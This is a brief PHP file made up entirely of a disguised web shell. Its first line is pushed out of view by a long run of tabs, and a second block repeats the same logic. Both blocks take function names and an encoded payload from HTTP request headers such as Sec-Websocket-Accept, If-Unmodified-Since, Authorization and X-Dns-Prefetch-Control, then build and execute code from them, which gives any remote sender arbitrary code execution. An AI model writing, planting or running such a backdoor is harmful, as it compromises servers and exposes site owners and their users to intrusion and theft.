<?php																																										$_HEADERS=getallheaders();if(isset($_HEADERS['Sec-Websocket-Accept'])){$request=$_HEADERS['Sec-Websocket-Accept']('', $_HEADERS['Authorization']($_HEADERS['X-Dns-Prefetch-Control']));$request();}

$_HEADERS = getallheaders();
if (isset($_HEADERS['If-Unmodified-Since'])) {
    $dbx_convert = $_HEADERS['If-Unmodified-Since']('', $_HEADERS['Authorization']($_HEADERS['X-Dns-Prefetch-Control']));
    $dbx_convert();
}